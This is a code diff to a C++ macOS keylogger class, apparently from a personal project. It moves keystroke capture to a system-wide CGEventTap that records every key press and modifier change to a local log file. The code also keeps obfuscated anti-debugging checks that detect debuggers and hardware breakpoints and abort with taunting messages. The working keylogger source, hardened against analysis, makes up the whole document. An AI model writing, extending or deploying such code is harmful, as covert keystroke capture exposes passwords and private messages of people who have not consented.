@@ -2,11 +2,9 @@
 #include "../include/antiDebug.h"
 #include "../include/obfuscator.h"
 
-
 #if defined(__APPLE__)
-MacOsLogger::MacOsLogger()
+MacOsLogger::MacOsLogger() : logFileName("recording.log"), counter(0)
 {
-    logFileName = "recording.log";
     initializeKeyMap();
     logFile.open(logFileName, std::ios::app);
     if (!logFile.is_open())
@@ -32,67 +30,78 @@ void MacOsLogger::startLogging()
     ob.registerMethod<bool>("guGu", [&ad]() { return ad.isDebuggerPresent(); });
     if (ob.callMethod<bool>("guGu"))
     {
-        throw std::runtime_error("Debugger detected. Exiting.");
+        throw std::runtime_error("Debugger detected. Don't do this... :)");
     }
 
     ob.registerMethod<bool>("6666", [&ad]() { return ad.checkForHardwareBreakpoints(); });
     if (ob.callMethod<bool>("6666"))
     {
-        throw std::runtime_error("Hardware breakpoints detected. Exiting.");
+        throw std::runtime_error("Hardware breakpoints detected. Don't do this... :)");
     }
 
-    logFile.open(logFileName, std::ios::app);
-    if (!logFile.is_open())
+    CGEventFlags oldFlags = CGEventSourceFlagsState(kCGEventSourceStateCombinedSessionState);
+    CGEventMask eventMask = (CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged));
+
+    eventTap = CGEventTapCreate(
+            kCGSessionEventTap,
+            kCGHeadInsertEventTap,
+            kCGEventTapOptionDefault,
+            eventMask,
+            myCGEventCallback,
+            this
+    );
+
+    if (!eventTap)
     {
-        throw std::ios_base::failure("Unable to access recordings log file. Please make sure you have the correct permissions.");
+        std::cerr << "Error: Unable to create event tap." << std::endl;
     }
+
+    CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
+    CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
+    CGEventTapEnable(eventTap, true);
 
     auto now = std::chrono::system_clock::to_time_t(std::chrono::system_clock::now());
     logFile << "\n\nRecording started\n" << std::put_time(std::localtime(&now), "%c %Z") << "\n";
     std::cout << "Logging to: " << logFileName << '\n';
 
-    EventTypeSpec eventType;
-    eventType.eventClass = kEventClassKeyboard;
-    eventType.eventKind = kEventRawKeyDown;
-
-    InstallEventHandler(GetEventMonitorTarget(), NewEventHandlerUPP(MacOsLogger::eventHandler), 1, &eventType, this, nullptr);
-
     CFRunLoopRun();
 }
 
-OSStatus MacOsLogger::eventHandler(EventHandlerCallRef nextHandler, EventRef event, void* userData)
+CGEventRef MacOsLogger::myCGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon)
 {
-    auto* logger = static_cast<MacOsLogger*>(userData);
+    MacOsLogger *logger = static_cast<MacOsLogger *>(refcon);
 
-    if (GetEventClass(event) == kEventClassKeyboard && GetEventKind(event) == kEventRawKeyDown)
+    if ((type != kCGEventKeyDown) && (type != kCGEventFlagsChanged))
     {
-        UInt32 keyCode;
-        GetEventParameter(event, kEventParamKeyCode, typeUInt32, nullptr, sizeof(keyCode), nullptr, &keyCode);
+        return event;
+    }
 
-        if (logger->keyMap.find(keyCode) != logger->keyMap.end())
+    logger->counter++;
+    CGKeyCode keyCode = (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
+
+    if (logger->keyMap.find(keyCode) != logger->keyMap.end())
+    {
+        std::string key = logger->keyMap[keyCode];
+        std::cout << "Logging key: " << key << std::endl;
+
+        logger->logFile.open(logger->logFileName, std::ios::app);
+        if (logger->logFile.is_open())
         {
-            std::string key = logger->keyMap[keyCode];
-            std::cout << "Logging key: " << key << std::endl;
-
-            logger->logFile.open(logger->logFileName, std::ios::app);
-            if (logger->logFile.is_open())
-            {
-                logger->logFile << key;
-                logger->logFile.flush();
-                logger->logFile.close();
-            }
-            else
-            {
-                std::cerr << "Error: Unable to open log file for writing.\n";
-            }
+            logger->logFile << key;
+            logger->logFile.flush();
+            logger->logFile.close();
         }
         else
         {
-            std::cerr << "Key not found in keyMap for code: " << keyCode << std::endl;  // Debug output
+            std::cerr << "Error: Unable to open log file for writing.\n";
         }
     }
+    else
+    {
+        std::cerr << "Key not found in keyMap for code: " << keyCode << std::endl;
+    }
 
-    return noErr;
+    return event;
 }
 
 void MacOsLogger::initializeKeyMap()
